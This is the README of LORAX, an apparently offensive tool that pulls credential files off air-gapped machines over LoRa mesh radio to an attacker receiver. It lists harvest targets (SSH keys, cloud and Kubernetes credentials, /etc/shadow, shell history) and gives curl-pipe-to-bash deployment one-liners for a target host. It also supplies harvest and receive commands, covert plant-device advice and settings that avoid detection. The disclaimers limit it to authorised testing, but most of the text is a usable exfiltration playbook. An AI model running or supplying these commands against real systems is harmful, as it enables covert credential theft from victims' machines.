# LORAX - LoRa Xtract  v1.2

<p align="center">
  <img src="Images/Logo.png" alt="LORAX logo" width="300"/>
</p>

> **Security research and demonstration tool only.**
> Built to demonstrate airgap data exfiltration via LoRa mesh radio for security talks and authorised penetration testing engagements. Do not use against systems you do not own or have explicit written permission to test.

---

## What is LORAX?

LORAX uses [Meshtastic](https://meshtastic.org/) LoRa mesh radio to pull credential files off a target machine and deliver them to an attacker-controlled receiver with no internet, Wi-Fi, or Bluetooth involved.

```
[Victim machine]
  └- Meshtastic node (USB or networked)
       └- LoRa RF  -->  [Solar relay node]  -->  [Attacker node (serial)]
                                                       └- [Attacker machine]
```

A solar relay in range of both ends means the machines don't need to be near each other and no network infrastructure is involved.

---

## Modes

| Mode | Description |
|---|---|
| `harvest` | Finds credential files on the victim machine and sends them in priority order |
| `send` | Sends a specific file |
| `recv` | Listens for incoming transfers, reassembles and verifies them |
| `scan` | Shows what harvest would find without sending anything |
| `probe` | Tests link quality - RTT, SNR, and a recommended `--delay` value |
| `conn` | Bidirectional connectivity check, run on both sides to confirm the link works both ways |
| `sniff` | Dumps all Meshtastic packets seen by a node, useful for diagnosing channel issues |
| `bench` | Benchmarks transfer throughput across four payload sizes |

---

## Harvest Targets

Files are collected in priority order (highest value first):

| Category | Files |
|---|---|
| SSH private keys | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`, `authorized_keys` |
| AWS credentials | `~/.aws/credentials`, `~/.aws/config` |
| GCloud | `application_default_credentials.json`, `credentials.db` |
| Kubernetes | `~/.kube/config` |
| Docker | `~/.docker/config.json` |
| Terraform | `~/.terraform.d/credentials.tfrc.json` |
| Package tokens | `~/.npmrc`, `~/.pypirc`, `~/.gem/credentials` |
| Netrc | `~/.netrc` |
| Git credentials | `~/.gitconfig`, `~/.git-credentials` |
| Shell history | `.bash_history`, `.zsh_history`, `.fish/fish_history`, `.sh_history` |
| System | `/etc/passwd`, `/etc/shadow` |
| `.env` files | Recursive search to depth 4 |

Filter by category with `--harvest-only ssh,aws,k8s` etc.

---

## Requirements

```bash
pip install -r requirements.txt
```

Python 3.8+. Compression, hashing, and archiving use the standard library.

---

## Deploying to a target

The quickest way to get LORAX onto a target with no Python installed and no admin access is the one-liner:

```bash
curl -s https://raw.githubusercontent.com/Zetascrub/LoraX/main/install.sh | bash
```

This fetches the correct pre-built binary for the target's OS and architecture, writes it to `/tmp/lorax` (or `~/.lorax` if `/tmp` is `noexec`), and makes it executable. No installation, no admin rights needed.

For a combined install and harvest, copy `deploy.sh.template`, fill in your engagement values, host it somewhere you control, and deliver it as:

```bash
bash <(curl -s http://YOUR_SERVER/deploy.sh)
```

---

## Usage

### Recv (attacker side - start this first)

```bash
python3 lorax.py --mode recv --radio serial --output ./loot
```

On startup the receiver prints its **public key** - copy this to use with `--pubkey` on the sender for E2E encryption.

### Harvest (victim side)

```bash
# No encryption (channel PSK only)
python3 lorax.py --mode harvest --radio 192.168.0.100 --dest '!aabbccdd'

# With E2E encryption
python3 lorax.py --mode harvest --radio 192.168.0.100 --dest '!aabbccdd' \
  --pubkey <receiver-public-key>

# Specific categories only
python3 lorax.py --mode harvest --radio 192.168.0.100 --dest '!aabbccdd' \
  --harvest-only ssh,aws,k8s
```

### Send a specific file

```bash
python3 lorax.py --mode send --radio 192.168.0.100 --dest '!aabbccdd' \
  --file /path/to/file --pubkey <receiver-public-key>
```

### Scan (no transmission)

```bash
python3 lorax.py --mode scan --radio 192.168.0.100
```

### Test the link before transferring

```bash
# Check link quality - requires recv running on the other end
python3 lorax.py --mode probe --radio 192.168.0.100 --dest '!aabbccdd'

# Check both directions - run on both sides at the same time
python3 lorax.py --mode conn --radio 192.168.0.100 --dest '!aabbccdd'  # sender side
python3 lorax.py --mode conn --radio serial         --dest '!11223344'  # receiver side
```

Both sides show `LINK UP` if the link is healthy in both directions. If only one side does, ACKs won't reach the sender (see notes below).

---

## Arguments

| Argument | Default | Description |
|---|---|---|
| `--mode` | required | See modes table above |
| `--radio` | required | IP address for a TCP-connected node, or `serial` for USB |
| `--dest` | `!aabbccdd` | Destination node ID |
| `--delay` | `10` | Seconds between chunks. Run `probe` for a link-specific value |
| `--file` | - | File to send (`send` mode only) |
| `--output` | `./received` | Output directory (`recv` mode) |
| `--extract` | off | Auto-extract tar bundles on receipt |
| `--port` | auto | Override serial port detection |
| `--harvest-only` | all | Comma-separated harvest category keys |
| `--wait-ack` | off | Wait for ACK/NACK after each transfer and retry on failure |
| `--pubkey` | - | Receiver's X25519 public key (base64url) for E2E encryption |
| `--keyfile` | `./lorax.key` | Receiver key file, generated on first run if missing |

---

## E2E Encryption

LORAX has built-in end-to-end encryption that works on top of whatever the Meshtastic channel provides. Even nodes sharing the same channel PSK can't read transferred content.

**Setup:**

1. Start the receiver - it prints a public key on startup:
   ```
   Public key: <base64url string>
   ```

2. Pass that key to the sender with `--pubkey`:
   ```bash
   python3 lorax.py --mode harvest --radio 192.168.0.100 --dest '!aabbccdd' \
     --pubkey <receiver-public-key>
   ```

The sender generates a fresh ephemeral X25519 key pair per transfer. Both sides run ECDH to produce a per-transfer session key via HKDF-SHA256. The filename and all chunk data are encrypted with ChaCha20-Poly1305. The receiver's private key stays in `./lorax.key` (mode 600) and never leaves the device.

---

## Protocol

Binary frames over Meshtastic `PRIVATE_APP` portnum 256:

```
[MAGIC: 2B "LX"][TYPE: 1B][TID: 3B][BODY: variable]
```

| Frame | Type | Body |
|---|---|---|
| `T_START` | `0x01` | total chunks, compression algo, enc flag, filename (or encrypted block) |
| `T_CHUNK` | `0x02` | seq number, chunk data (or ciphertext) |
| `T_END` | `0x03` | MD5 of original plaintext |
| `T_ACK` | `0x04` | empty |
| `T_NACK` | `0x05` | list of missing seq numbers |
| `T_PING` | `0x06` | empty |
| `T_PONG` | `0x07` | SNR, hop count |
| `T_CHECK` | `0x08` | MD5 + filename - asks "do you already have this?" |
| `T_HAVE` | `0x09` | MD5 - confirms receiver already has the file |
| `T_CHECKPOINT` | `0x0A` | last seq seen - triggers mid-transfer NACK |

Packet budget: 237B LoRa payload, 54B Meshtastic overhead, 8B frame header = **175B usable per chunk**.

---

## Hardware

Tested with:

- **Heltec V3** - networked node (TCP), acts as victim radio
- **ThinkNode M1** - USB serial node, acts as attacker receiver
- **RAK4631** - solar-powered relay node

Any hardware on the [Meshtastic supported hardware list](https://meshtastic.org/docs/hardware) should work. Connect via `--radio <IP>` for TCP nodes or `--radio serial` for USB.

### Recommended plant device: LILYGO T-Echo Lite

Small, USB-C, runs Meshtastic firmware, under £25. Plug it into any USB-C port on the target, drop the `lorax` binary, run harvest. No drivers needed on the target side.

For longer unattended deployments a Pi Zero 2W with a LoRa hat and a small LiPo fits inside a standard USB wall charger.

---

## Meshtastic Config Notes

**`rebroadcastMode: CORE_PORTNUMS_ONLY` breaks ACK delivery**

If the victim radio has this set, it silently drops all `PRIVATE_APP` packets before they reach the Python client. Transfers work but ACKs never arrive and the sender retransmits indefinitely. Fix it with:

```bash
meshtastic --host <radio-ip> --set device.rebroadcast_mode ALL
meshtastic --host <radio-ip> --reboot
```

Use `--mode conn` to verify the link is bidirectional before starting a transfer.

**MQTT**

Meshtastic nodes with MQTT enabled publish traffic metadata to a broker. Disable it on all nodes used for covert work:

```bash
meshtastic --port /dev/ttyACM0 --set mqtt.enabled false
```

**Default channel PSK**

The Meshtastic default PSK (`AQ==`) is publicly known. Any stock Meshtastic device can decrypt traffic on the default channel. Use a custom channel with a random PSK for anything sensitive.

---

## Limitations

- LoRa is slow. A typical credential harvest takes a few minutes at the default 10s delay
- EU 868 MHz has a 1% duty cycle limit - heavy use can trigger a TX backoff window
- File size limit is 512 KB per file (configurable in source)
- E2E encryption adds ~60B to the START frame and 16B per chunk

---

## License

MIT - see [LICENSE](LICENSE)

---

## Disclaimer

For **authorised security testing, CTF competitions, and educational demonstrations only**. The author accepts no responsibility for misuse. Always obtain written permission before testing any system you do not own.
